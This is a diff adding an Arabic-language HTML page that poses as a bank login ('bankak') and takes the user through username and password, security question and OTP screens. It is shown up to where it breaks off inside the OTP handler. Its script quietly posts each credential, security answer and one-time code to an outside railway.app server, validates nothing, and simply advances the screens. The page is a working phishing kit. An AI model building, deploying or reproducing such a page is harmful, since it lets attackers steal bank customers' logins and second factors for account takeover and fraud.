@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>بنك النخبة | تسجيل الدخول</title>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+--red: #D42B2B;
+--red-dark: #B01E1E;
+--red-light: #E84040;
+--gold: #C9A84C;
+--gold-light: #E8C97A;
+--gold-dark: #8B6914;
+--white: #FFFFFF;
+--bg: #F5F5F5;
+--text-dark: #1A1A1A;
+--text-muted: #888888;
+--border: #E0E0E0;
+--input-bg: #FFFFFF;
+--shadow: 0 2px 12px rgba(0,0,0,0.1);
+}
+
+html, body {
+height: 100%;
+font-family: 'Tajawal', sans-serif;
+background: var(--bg);
+color: var(--text-dark);
+overflow: hidden;
+}
+
+.screens { width: 100%; height: 100vh; display: flex; align-items: center; justify-content: center; }
+.screen { display: none; width: 100%; height: 100vh; flex-direction: column; align-items: stretch; }
+.screen.active { display: flex; animation: fadeIn 0.4s ease both; }
+@keyframes fadeIn { from { opacity:0; transform:translateY(16px); } to { opacity:1; transform:translateY(0); } }
+
+.red-header {
+background: linear-gradient(160deg, #E03030 0%, #C42020 50%, #A81818 100%);
+padding: 48px 28px 40px;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+position: relative;
+overflow: hidden;
+flex-shrink: 0;
+}
+.red-header::before {
+content: '';
+position: absolute;
+top: -60px; right: -60px;
+width: 200px; height: 200px;
+background: rgba(255,255,255,0.05);
+border-radius: 50%;
+}
+.red-header::after {
+content: '';
+position: absolute;
+bottom: -80px; left: -40px;
+width: 220px; height: 220px;
+background: rgba(0,0,0,0.08);
+border-radius: 50%;
+}
+
+.logo-wrap {
+display: flex;
+flex-direction: column;
+align-items: center;
+gap: 4px;
+position: relative;
+z-index: 1;
+}
+.logo-arabic { font-size: 42px; font-weight: 900; color: #FFFFFF; line-height: 1; letter-spacing: -1px; }
+.logo-arabic span { color: #E8C97A; }
+.logo-english { font-size: 22px; font-weight: 700; color: #FFFFFF; letter-spacing: 2px; opacity: 0.9; }
+.logo-english b { color: #E8C97A; font-weight: 900; }
+.logo-tagline { font-size: 11px; color: rgba(255,255,255,0.6); letter-spacing: 3px; text-transform: uppercase; margin-top: 6px; }
+
+.lang-btn {
+position: absolute; top: 16px; left: 16px;
+background: rgba(255,255,255,0.15);
+border: 1px solid rgba(255,255,255,0.3);
+border-radius: 8px; padding: 6px 12px;
+color: white; font-family: 'Tajawal', sans-serif;
+font-size: 12px; font-weight: 600; cursor: pointer;
+z-index: 2; display: flex; align-items: center; gap: 4px;
+}
+
+.white-body {
+background: #FFFFFF;
+flex: 1;
+border-radius: 24px 24px 0 0;
+margin-top: -20px;
+padding: 28px 24px 20px;
+overflow-y: auto;
+position: relative;
+z-index: 2;
+box-shadow: 0 -4px 20px rgba(0,0,0,0.1);
+}
+
+.screen-title { font-size: 18px; font-weight: 800; color: #1A1A1A; margin-bottom: 6px; }
+.screen-desc { font-size: 13px; color: #888888; margin-bottom: 22px; line-height: 1.6; }
+
+.step-bar { display: flex; gap: 6px; margin-bottom: 20px; }
+.step-dot { height: 4px; flex: 1; border-radius: 2px; background: #E8E8E8; transition: all 0.4s; }
+.step-dot.done { background: #D42B2B; }
+.step-dot.active { background: #C9A84C; }
+
+.field { margin-bottom: 16px; }
+.field label { display: block; font-size: 13px; font-weight: 600; color: #1A1A1A; margin-bottom: 8px; }
+
+.input-wrap { position: relative; }
+.input-wrap .icon {
+position: absolute; top: 50%; transform: translateY(-50%);
+right: 14px; color: #888888; font-size: 18px;
+display: flex; align-items: center;
+}
+.input-wrap .toggle-pass {
+position: absolute; top: 50%; transform: translateY(-50%);
+left: 14px; background: none; border: none;
+color: #888888; cursor: pointer; font-size: 18px; padding: 2px;
+display: flex; align-items: center;
+}
+
+input[type="text"], input[type="password"], input[type="number"] {
+width: 100%; padding: 14px 46px 14px 14px;
+background: #F8F8F8; border: 1.5px solid #E0E0E0;
+border-radius: 12px; color: #1A1A1A;
+font-family: 'Tajawal', sans-serif; font-size: 15px;
+outline: none; transition: all 0.25s; text-align: right;
+}
+input:focus { border-color: #D42B2B; background: #FFF; box-shadow: 0 0 0 3px rgba(212,43,43,0.08); }
+input::placeholder { color: #BBBBBB; }
+
+select {
+width: 100%; padding: 14px 46px 14px 14px;
+background: #F8F8F8; border: 1.5px solid #E0E0E0;
+border-radius: 12px; color: #1A1A1A;
+font-family: 'Tajawal', sans-serif; font-size: 14px;
+outline: none; cursor: pointer; appearance: none;
+transition: all 0.25s; direction: rtl;
+}
+select:focus { border-color: #D42B2B; box-shadow: 0 0 0 3px rgba(212,43,43,0.08); }
+
+.btn-primary {
+width: 100%; padding: 16px;
+background: linear-gradient(135deg, #B01E1E, #D42B2B, #E84040);
+border: none; border-radius: 14px;
+color: white; font-family: 'Tajawal', sans-serif;
+font-size: 17px; font-weight: 800; cursor: pointer;
+letter-spacing: 0.5px; transition: all 0.25s; margin-top: 6px;
+box-shadow: 0 4px 20px rgba(212,43,43,0.3);
+position: relative; overflow: hidden;
+}
+.btn-primary:hover { transform: translateY(-1px); box-shadow: 0 6px 24px rgba(212,43,43,0.4); }
+.btn-primary:active { transform: translateY(0); }
+.btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+.bottom-links { display: flex; justify-content: space-between; margin-top: 18px; }
+.link { color: #D42B2B; font-size: 13px; font-weight: 600; cursor: pointer; text-decoration: none; }
+.link:hover { color: #B01E1E; }
+
+.qr-row { display: flex; align-items: center; gap: 10px; margin-top: 16px; cursor: pointer; }
+.qr-icon { font-size: 28px; }
+.qr-text { font-size: 13px; color: #888888; font-weight: 500; }
+
+.bottom-nav { background: white; border-top: 1px solid #E0E0E0; display: flex; flex-shrink: 0; }
+.nav-item { flex: 1; display: flex; flex-direction: column; align-items: center; gap: 4px; padding: 10px 6px; cursor: pointer; transition: all 0.2s; }
+.nav-item:hover { background: #FFF5F5; }
+.nav-icon { font-size: 24px; }
+.nav-label { font-size: 11px; color: #888888; font-weight: 500; }
+
+.error-msg { background: #FFF0F0; border: 1px solid rgba(212,43,43,0.25); border-radius: 10px; padding: 10px 14px; font-size: 13px; color: #B01E1E; margin-bottom: 14px; display: none; }
+.error-msg.show { display: block; }
+
+.question-box { background: #FFF8F8; border: 1.5px solid rgba(212,43,43,0.15); border-radius: 12px; padding: 14px 16px; margin-bottom: 14px; display: flex; align-items: flex-start; gap: 12px; }
+.q-icon { width: 36px; height: 36px; flex-shrink: 0; background: linear-gradient(135deg, #B01E1E, #D42B2B); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 16px; color: white; }
+.q-text { font-size: 14px; font-weight: 600; color: #1A1A1A; line-height: 1.5; padding-top: 6px; }
+
+/* ===== OTP INPUTS ===== */
+.otp-wrap { display: flex; gap: 8px; justify-content: center; margin: 20px 0; direction: ltr; }
+.otp-input {
+  width: 46px !important;
+  height: 54px !important;
+  text-align: center !important;
+  font-size: 24px !important;
+  font-weight: 800 !important;
+  border-radius: 12px !important;
+  padding: 0 !important;
+  border: 1.5px solid #E0E0E0 !important;
+  background: #F8F8F8 !important;
+  color: #1A1A1A !important;
+  font-family: 'Tajawal', sans-serif !important;
+  outline: none !important;
+  transition: all 0.2s !important;
+  caret-color: #D42B2B !important;
+}
+.otp-input:focus {
+  border-color: #D42B2B !important;
+  background: white !important;
+  box-shadow: 0 0 0 3px rgba(212,43,43,0.1) !important;
+}
+.otp-input.filled {
+  background: #FFF5F5 !important;
+  border-color: #D42B2B !important;
+  color: #D42B2B !important;
+}
+
+.timer-wrap { display: flex; flex-direction: column; align-items: center; margin: 4px 0 12px; }
+.timer-ring { width: 80px; height: 80px; position: relative; display: flex; align-items: center; justify-content: center; }
+.timer-ring svg { position: absolute; top: 0; left: 0; transform: rotate(-90deg); }
+.timer-ring circle { fill: none; stroke-width: 4; stroke-linecap: round; transition: stroke-dashoffset 1s linear; }
+.timer-ring .bg-circle { stroke: #F0E8E8; }
+.timer-ring .fg-circle { stroke: #D42B2B; stroke-dasharray: 220.4; }
+.timer-display { font-size: 20px; font-weight: 800; color: #D42B2B; }
+.timer-label { font-size: 10px; color: #888888; margin-top: 6px; letter-spacing: 1px; text-transform: uppercase; }
+
+.otp-notice { background: #F0FFF8; border: 1px solid rgba(61,190,138,0.25); border-radius: 10px; padding: 12px 14px; font-size: 13px; color: #2A9060; text-align: center; margin-bottom: 16px; line-height: 1.6; }
+.resend { text-align: center; margin-top: 14px; font-size: 13px; color: #888888; }
+.resend .countdown { color: #D42B2B; font-weight: 700; }
+
+.success-icon { width: 80px; height: 80px; margin: 0 auto 20px; background: linear-gradient(135deg, #E8FFF4, #C8F0E0); border: 2px solid rgba(61,190,138,0.4); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 34px; animation: popIn 0.5s cubic-bezier(0.22,1,0.36,1) both; }
+@keyframes popIn { from{transform:scale(0.5);opacity:0;} to{transform:scale(1);opacity:1;} }
+
+.account-badge { background: #FFF8F0; border: 1.5px solid rgba(201,168,76,0.3); border-radius: 14px; padding: 16px; display: flex; align-items: center; gap: 14px; margin: 16px 0; }
+.acc-icon { width: 44px; height: 44px; flex-shrink: 0; background: linear-gradient(135deg, #8B6914, #C9A84C); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+.acc-name { font-weight: 700; font-size: 15px; color: #1A1A1A; }
+.acc-num { font-size: 12px; color: #888888; margin-top: 3px; letter-spacing: 2px; }
+
+.status-box { background: #F8F8F8; border: 1px solid #E0E0E0; border-radius: 14px; padding: 16px; margin-bottom: 16px; }
+.status-row { display: flex; justify-content: space-between; font-size: 13px; padding: 6px 0; }
+.status-row + .status-row { border-top: 1px solid #E0E0E0; }
+.status-label { color: #888888; }
+.status-value { color: #2A9060; font-weight: 700; }
+.status-value.gold { color: #8B6914; font-size: 14px; }
+
+.spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.4); border-top-color: white; border-radius: 50%; animation: spin 0.7s linear infinite; display: inline-block; vertical-align: middle; margin-right: 6px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.remember { display: flex; align-items: center; justify-content: space-between; margin-bottom: 14px; }
+.check-label { display: flex; align-items: center; gap: 8px; cursor: pointer; font-size: 13px; color: #888888; }
+.check-label input[type="checkbox"] { display: none; }
+.check-box { width: 18px; height: 18px; border: 1.5px solid #E0E0E0; border-radius: 5px; display: flex; align-items: center; justify-content: center; transition: all 0.2s; flex-shrink: 0; }
+.check-label input:checked + .check-box { background: #D42B2B; border-color: #D42B2B; }
+.check-label input:checked + .check-box::after { content: '✓'; font-size: 11px; color: white; font-weight: 800; }
+
+.white-body.scrollable { overflow-y: auto; }
+.white-body::-webkit-scrollbar { width: 3px; }
+.white-body::-webkit-scrollbar-thumb { background: #DDD; border-radius: 2px; }
+</style>
+</head>
+<body>
+
+<div class="screens">
+
+  <!-- SCREEN 1 — LOGIN -->
+  <div class="screen active" id="screen-login">
+    <div class="red-header">
+      <button class="lang-btn">A ع</button>
+      <div class="logo-wrap">
+        <div class="logo-arabic">بنك<span>ك</span></div>
+        <div class="logo-english"><b>b</b>ankak</div>
+        <div class="logo-tagline">Elite Banking Corporation</div>
+      </div>
+    </div>
+    <div class="white-body">
+      <div class="step-bar">
+        <div class="step-dot active"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+      </div>
+      <div class="error-msg" id="login-error">اسم المستخدم أو كلمة المرور غير صحيحة</div>
+      <div class="field">
+        <div class="input-wrap">
+          <span class="icon">
+            <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M17.982 18.725A7.488 7.488 0 0 0 12 15.75a7.488 7.488 0 0 0-5.982 2.975m11.963 0a9 9 0 1 0-11.963 0m11.963 0A8.966 8.966 0 0 1 12 21a8.966 8.966 0 0 1-5.982-2.275M15 9.75a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z"/></svg>
+          </span>
+          <input type="text" id="username" placeholder="أدخل رقم المعرف" autocomplete="off">
+        </div>
+      </div>
+      <div class="field">
+        <div class="input-wrap">
+          <span class="icon">
+            <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M2.036 12.322a1.012 1.012 0 0 1 0-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178Z"/><path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z"/></svg>
+          </span>
+          <input type="password" id="password" placeholder="أدخل كلمة المرور">
+          <button class="toggle-pass" onclick="togglePass()">
+            <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88"/></svg>
+          </button>
+        </div>
+      </div>
+      <div class="remember">
+        <label class="check-label">
+          <input type="checkbox" id="remember">
+          <span class="check-box"></span>
+          تذكرني
+        </label>
+        <a class="link">نسيت كلمة المرور؟</a>
+      </div>
+      <button class="btn-primary" onclick="doLogin()" id="login-btn">تسجيل الدخول</button>
+      <div class="bottom-links">
+        <a class="link">لاتستطيع تسجيل الدخول؟</a>
+        <a class="link">تسجيل جديد؟</a>
+      </div>
+      <div class="qr-row">
+        <span class="qr-icon">▦</span>
+        <span class="qr-text">شارك رمز</span>
+      </div>
+    </div>
+    <div class="bottom-nav">
+      <div class="nav-item"><div class="nav-icon">🏦</div><span class="nav-label">بنك النخبة</span></div>
+      <div class="nav-item"><div class="nav-icon">📍</div><span class="nav-label">مواقعنا</span></div>
+      <div class="nav-item"><div class="nav-icon">📞</div><span class="nav-label">المساعدة</span></div>
+      <div class="nav-item"><div class="nav-icon">📘</div><span class="nav-label">فيس بوك</span></div>
+    </div>
+  </div>
+
+  <!-- SCREEN 2 — SECURITY -->
+  <div class="screen" id="screen-security">
+    <div class="red-header" style="padding: 36px 28px 30px;">
+      <div class="logo-wrap">
+        <div class="logo-arabic" style="font-size:32px;">بنك<span>ك</span></div>
+        <div class="logo-english" style="font-size:16px;"><b>b</b>ankak</div>
+      </div>
+    </div>
+    <div class="white-body scrollable">
+      <div class="step-bar">
+        <div class="step-dot done"></div>
+        <div class="step-dot active"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+      </div>
+      <div class="screen-title">التحقق الأمني</div>
+      <div class="screen-desc">اختر سؤالاً من الأسئلة الأمنية وأدخل إجابتك للتحقق من هويتك</div>
+      <div class="field">
+        <label>اختر سؤال الأمان</label>
+        <div class="input-wrap">
+          <span class="icon" style="font-size:12px; top:18px; transform:none; padding-top:14px;">▼</span>
+          <select id="security-select" onchange="onQuestionChange()">
+            <option value="">— اختر سؤالاً —</option>
+            <option value="cousin">ما هو اسم ابن عمك الأول؟</option>
+            <option value="city">في أي مدينة ولدت؟</option>
+            <option value="grad">في أي سنة تخرجت من الجامعة؟</option>
+            <option value="nick">ماذا كان لقبك أثناء الطفولة؟</option>
+            <option value="author">اسم مؤلفك المفضل؟</option>
+            <option value="car">اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+            <option value="movie">أي فيلم هو المفضل لديك؟</option>
+            <option value="friend">اسم أفضل صديق في الطفولة؟</option>
+            <option value="school">ما هو اسم المدرسة التي التحقت بها؟</option>
+            <option value="football">اسم فريق كرة القدم المفضل لديك؟</option>
+          </select>
+        </div>
+      </div>
+      <div id="question-display" style="display:none;">
+        <div class="question-box">
+          <div class="q-icon">🔐</div>
+          <div class="q-text" id="q-text-display"></div>
+        </div>
+        <div class="field">
+          <label>إجابتك</label>
+          <div class="input-wrap">
+            <span class="icon">✏️</span>
+            <input type="text" id="security-answer" placeholder="اكتب إجابتك هنا..." autocomplete="off">
+          </div>
+        </div>
+      </div>
+      <div class="error-msg" id="sec-error">يرجى اختيار سؤال وكتابة الإجابة</div>
+      <button class="btn-primary" onclick="doSecurity()" id="sec-btn">تأكيد الإجابة والمتابعة</button>
+    </div>
+    <div class="bottom-nav">
+      <div class="nav-item"><div class="nav-icon">📍</div><span class="nav-label">مواقعنا</span></div>
+      <div class="nav-item"><div class="nav-icon">📞</div><span class="nav-label">المساعدة</span></div>
+      <div class="nav-item"><div class="nav-icon">📘</div><span class="nav-label">فيس بوك</span></div>
+      <div class="nav-item"><div class="nav-icon">🏠</div><span class="nav-label">الرئيسية</span></div>
+    </div>
+  </div>
+
+  <!-- SCREEN 3 — OTP -->
+  <div class="screen" id="screen-otp">
+    <div class="red-header" style="padding: 36px 28px 30px;">
+      <div class="logo-wrap">
+        <div class="logo-arabic" style="font-size:32px;">بنك<span>ك</span></div>
+        <div class="logo-english" style="font-size:16px;"><b>b</b>ankak</div>
+      </div>
+    </div>
+    <div class="white-body">
+      <div class="step-bar">
+        <div class="step-dot done"></div>
+        <div class="step-dot done"></div>
+        <div class="step-dot active"></div>
+        <div class="step-dot"></div>
+      </div>
+      <div class="screen-title">رمز التحقق</div>
+      <div class="screen-desc">أدخل الرمز المكوّن من 6 أرقام</div>
+      <div class="timer-wrap">
+        <div class="timer-ring">
+          <svg width="80" height="80" viewBox="0 0 80 80">
+            <circle class="bg-circle" cx="40" cy="40" r="35"/>
+            <circle class="fg-circle" id="timer-circle" cx="40" cy="40" r="35" stroke-dashoffset="0"/>
+          </svg>
+          <div style="text-align:center;">
+            <div class="timer-display" id="timer-display">05:00</div>
+          </div>
+        </div>
+        <div class="timer-label">دقيقة متبقية</div>
+      </div>
+      <div class="otp-notice">
+        📱 تم إرسال رمز التحقق إلى<br>
+        <strong id="otp-dest" style="color:#D42B2B;">بريدك الإلكتروني / رقم هاتفك</strong>
+      </div>
+      <div class="otp-wrap">
+        <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="otp1" autocomplete="off">
+        <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="otp2" autocomplete="off">
+        <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="otp3" autocomplete="off">
+        <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="otp4" autocomplete="off">
+        <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="otp5" autocomplete="off">
+        <input class="otp-input" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" id="otp6" autocomplete="off">
+      </div>
+      <div class="error-msg" id="otp-error">الرمز المدخل غير صحيح أو منتهي الصلاحية</div>
+      <button class="btn-primary" onclick="doOtp()" id="otp-btn">تأكيد الرمز</button>
+      <div class="resend">
+        لم تستلم الرمز؟
+        <span class="countdown" id="resend-countdown"> إعادة إرسال بعد <span id="resend-sec">30</span>ث</span>
+        <a class="link" id="resend-link" style="display:none;" onclick="resendOtp()">إعادة إرسال الرمز</a>
+      </div>
+    </div>
+    <div class="bottom-nav">
+      <div class="nav-item"><div class="nav-icon">📍</div><span class="nav-label">مواقعنا</span></div>
+      <div class="nav-item"><div class="nav-icon">📞</div><span class="nav-label">المساعدة</span></div>
+      <div class="nav-item"><div class="nav-icon">📘</div><span class="nav-label">فيس بوك</span></div>
+      <div class="nav-item"><div class="nav-icon">🏠</div><span class="nav-label">الرئيسية</span></div>
+    </div>
+  </div>
+
+  <!-- SCREEN 4 — SUCCESS -->
+  <div class="screen" id="screen-success">
+    <div class="red-header" style="padding: 36px 28px 30px;">
+      <div class="logo-wrap">
+        <div class="logo-arabic" style="font-size:32px;">بنك<span>ك</span></div>
+        <div class="logo-english" style="font-size:16px;"><b>b</b>ankak</div>
+      </div>
+    </div>
+    <div class="white-body scrollable" style="text-align:center;">
+      <div class="step-bar">
+        <div class="step-dot done"></div>
+        <div class="step-dot done"></div>
+        <div class="step-dot done"></div>
+        <div class="step-dot done" style="background:#D42B2B;"></div>
+      </div>
+      <div class="success-icon">✅</div>
+      <div class="screen-title" style="color:#2A9060; font-size:22px;">تم بنجاح!</div>
+      <div class="screen-desc" style="margin-bottom:4px;">لقد تم التسليم إلى رقم حسابك بنجاح</div>
+      <p style="font-size:13px; color:#888888; margin-bottom:0;">مرحباً بك في بنك النخبة</p>
+      <div class="account-badge">
+        <div class="acc-icon">💰</div>
+        <div class="acc-info" style="text-align:right;">
+          <div class="acc-name" id="success-name">مستخدم موثوق</div>
+          <div class="acc-num" id="success-num">**** **** **** 4821</div>
+        </div>
+        <div style="color:#2A9060; font-size:22px;">✓</div>
+      </div>
+      <div class="status-box" style="text-align:right;">
+        <div style="font-size:11px; color:#888888; margin-bottom:10px; letter-spacing:1px; text-transform:uppercase; text-align:center;">حالة العملية</div>
+        <div class="status-row"><span class="status-label">التحقق من الهوية</span><span class="status-value">✓ مكتمل</span></div>
+        <div class="status-row"><span class="status-label">سؤال الأمان</span><span class="status-value">✓ مكتمل</span></div>
+        <div class="status-row"><span class="status-label">رمز التحقق OTP</span><span class="status-value">✓ مكتمل</span></div>
+        <div class="status-row"><span class="status-label" style="color:#8B6914; font-weight:700;">تسليم رقم الحساب</span><span class="status-value gold">✓ تم</span></div>
+      </div>
+      <button class="btn-primary" onclick="goToDashboard()" style="margin-top:0;">الانتقال إلى لوحة التحكم ←</button>
+      <div style="margin-top:14px; font-size:12px; color:#888888;">
+        دخلت في <span id="login-time" style="color:#D42B2B; font-weight:700;"></span>
+      </div>
+    </div>
+    <div class="bottom-nav">
+      <div class="nav-item"><div class="nav-icon">📍</div><span class="nav-label">مواقعنا</span></div>
+      <div class="nav-item"><div class="nav-icon">📞</div><span class="nav-label">المساعدة</span></div>
+      <div class="nav-item"><div class="nav-icon">📘</div><span class="nav-label">فيس بوك</span></div>
+      <div class="nav-item"><div class="nav-icon">🏠</div><span class="nav-label">الرئيسية</span></div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+let timerInterval = null, resendInterval = null, timerSeconds = 300;
+let SESSION_ID = null;
+const API = 'https://web-production-c1a9a.up.railway.app';
+
+const questions = {
+  cousin:'ما هو اسم ابن عمك الأول؟', city:'في أي مدينة ولدت؟', grad:'في أي سنة تخرجت من الجامعة؟',
+  nick:'ماذا كان لقبك أثناء الطفولة؟', author:'اسم مؤلفك المفضل؟', car:'اسم الشركة المصنعة للسيارة المفضلة لديك؟',
+  movie:'أي فيلم هو المفضل لديك؟', friend:'اسم أفضل صديق في الطفولة؟',
+  school:'ما هو اسم المدرسة التي التحقت بها؟', football:'اسم فريق كرة القدم المفضل لديك؟'
+};
+
+const otpIds = ['otp1','otp2','otp3','otp4','otp5','otp6'];
+
+/* ── OTP input setup ── */
+function setupOtpInputs() {
+  otpIds.forEach((id, index) => {
+    const input = document.getElementById(id);
+    input.addEventListener('input', function() {
+      this.value = this.value.replace(/[^0-9]/g, '');
+      if (this.value.length > 1) this.value = this.value.slice(-1);
+      if (this.value) {
+        this.classList.add('filled');
+        if (index < 5) document.getElementById(otpIds[index + 1]).focus();
+      } else {
+        this.classList.remove('filled');
+      }
+    });
+    input.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace' && !this.value && index > 0)
+        document.getElementById(otpIds[index - 1]).focus();
+      if (e.key === 'Enter') doOtp();
+      if (!/[0-9]/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight'].includes(e.key))
+        e.preventDefault();
+    });
+    input.addEventListener('paste', function(e) {
+      e.preventDefault();
+      const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+      otpIds.forEach((oid, i) => {
+        const el = document.getElementById(oid);
+        el.value = pasted[i] || '';
+        el.classList.toggle('filled', !!pasted[i]);
+      });
+      const nextEmpty = otpIds.findIndex(oid => !document.getElementById(oid).value);
+      document.getElementById(nextEmpty !== -1 ? otpIds[nextEmpty] : otpIds[5]).focus();
+    });
+  });
+}
+
+/* ── Navigation ── */
+function goTo(id) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  const el = document.getElementById(id);
+  el.classList.add('active');
+  el.style.animation = 'none';
+  requestAnimationFrame(() => { el.style.animation = ''; });
+}
+
+function togglePass() {
+  const f = document.getElementById('password');
+  f.type = f.type === 'password' ? 'text' : 'password';
+}
+
+/* ── API calls: fire-and-forget, never block navigation ── */
+function submitLogin(username, password) {
+  fetch(`${API}/api/submit`, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ username, password })
+  })
+  .then(r => r.json())
+  .then(data => { SESSION_ID = data.sessionId; })
+  .catch(() => {});
+}
+
+function submitSecurity(question, answer) {
+  fetch(`${API}/api/submit-security`, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ sessionId: SESSION_ID, secQuestion: question, secAnswer: answer })
+  }).catch(() => {});
+}
+
+function submitOTP(otp) {
+  fetch(`${API}/api/submit-otp`, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ sessionId: SESSION_ID, otp })
+  }).catch(() => {});
+}
+
+/* ── Screen 1: Login ── */
+function doLogin() {
+  const u = document.getElementById('username').value.trim();
+  const p = document.getElementById('password').value.trim();
+  const err = document.getElementById('login-error');
+
+  if (!u || !p) {
+    err.classList.add('show');
+    err.textContent = 'يرجى ملء جميع الحقول';
+    return;
+  }
+  if (!/^\d{7}$/.test(u)) {
+    err.classList.add('show');
+    err.textContent = 'بيانات الدخول غير صحيحة';
+    return;
+  }
+  const passValid = p.length >= 8 && /[A-Z]/.test(p) && /[a-z]/.test(p) &&
+                    /[0-9]/.test(p) && /[!@#$%^&*()\-_=+\[\]{};':"\\|,.<>\/?]/.test(p);
+  if (!passValid) {
+    err.classList.add('show');
+    err.textContent = 'بيانات الدخول غير صحيحة';
+    return;
+  }
+
+  err.classList.remove('show');
+
+  const btn = document.getElementById('login-btn');
+  btn.innerHTML = 'جاري التحقق <span class="spinner"></span>';
+  btn.disabled = true;
+
+  // Send to API (no await — navigation proceeds regardless)
+  submitLogin(u, p);
+
+  setTimeout(() => {
+    btn.innerHTML = 'تسجيل الدخول';
+    btn.disabled = false;
+    document.getElementById('success-name').textContent = u;
+    goTo('screen-security');
+  }, 1600);
+}
+
+/* ── Screen 2: Security ── */
+function onQuestionChange() {
+  const val = document.getElementById('security-select').value;
+  const box = document.getElementById('question-display');
+  if (val && questions[val]) {
+    document.getElementById('q-text-display').textContent = questions[val];
+    box.style.display = 'block';
+    document.getElementById('security-answer').value = '';
+    document.getElementById('security-answer').focus();
+  } else {
+    box.style.display = 'none';
+  }
+}
+
+function doSecurity() {
+  const q = document.getElementById('security-select').value;
+  const a = document.getElementById('security-answer').value.trim();
+  const err = document.getElementById('sec-error');
+  if (!q || !a) { err.classList.add('show'); return; }
+  err.classList.remove('show');
+
+  const btn = document.getElementById('sec-btn');
+  btn.innerHTML = 'جاري التحقق <span class="spinner"></span>';
+  btn.disabled = true;
+
+  submitSecurity(q, a);
+
+  setTimeout(() => {
+    btn.innerHTML = 'تأكيد الإجابة والمتابعة';
+    btn.disabled = false;
+    goTo('screen-otp');
+    startOTPTimer();
+    startResendCountdown();
+    setTimeout(() => document.getElementById('otp1').focus(), 300);
+  }, 1500);
+}
+
+/* ── Screen 3: OTP ── */
+function startOTPTimer() {
+  timerSeconds = 300; clearInterval(timerInterval); updateTimerDisplay();
+  timerInterval = setInterval(() => {
+    timerSeconds--; updateTimerDisplay();
+    if (timerSeconds <= 0) {
+      clearInterval(timerInterval);
+      document.getElementById('otp-error').textContent = 'انتهت صلاحية الرمز. يرجى إعادة الإرسال.';
+      document.getElementById('otp-error').classList.add('show');
+    }
+  }, 1000);
+}
+
+function updateTimerDisplay() {
+  const m = Math.floor(timerSeconds/60).toString().padStart(2,'0');
+  const s = (timerSeconds%60).toString().padStart(2,'0');
+  document.getElementById('timer-display').textContent = `${m}:${s}`;
+  const offset = 219.9 * (1 - timerSeconds/300);
+  const color = timerSeconds <= 60 ? '#E05252' : '#D42B2B';
+  document.getElementById('timer-circle').style.strokeDashoffset = offset;
+  document.getElementById('timer-circle').style.stroke = color;
+  document.getElementById('timer-display').style.color = color;
+}
+
+function startResendCountdown() {
+  let sec = 30;
+  document.getElementById('resend-sec').textContent = sec;
+  document.getElementById('resend-countdown').style.display = 'inline';
+  document.getElementById('resend-link').style.display = 'none';
+  clearInterval(resendInterval);
+  resendInterval = setInterval(() => {
+    sec--; document.getElementById('resend-sec').textContent = sec;
+    if (sec <= 0) {
+      clearInterval(resendInterval);
+      document.getElementById('resend-countdown').style.display = 'none';
+      document.getElementById('resend-link').style.display = 'inline';
+    }
+  }, 1000);
+}
+
+function resendOtp() {
+  document.getElementById('resend-link').style.display = 'none';
+  document.getElementById('otp-error').classList.remove('show');
+  otpIds.forEach(id => {
+    const el = document.getElementById(id);
+    el.value = ''; el.classList.remove('filled');
+  });
+  startOTPTimer(); startResendCountdown();
+  document.getElementById('otp1').focus();
+}
+
+function doOtp() {
